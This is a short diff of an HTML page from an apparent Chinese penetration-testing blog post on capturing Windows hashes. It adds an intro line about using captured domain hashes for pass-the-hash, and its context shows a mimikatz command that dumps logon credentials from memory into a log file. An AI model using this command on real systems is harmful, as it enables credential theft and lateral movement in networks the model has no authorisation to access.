@@ -183,7 +183,8 @@
       
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="1mimikatz"><a href="#1mimikatz" class="headerlink" title="1mimikatz"></a>1mimikatz</h1><p>只需要管理员权限</p>
+  <p>在内网渗透中拿到普通域用户/域管 hash，就可以直接pth。</p>
+<h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>只需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220325161740275.png" alt="image-20220325161740275"></p>
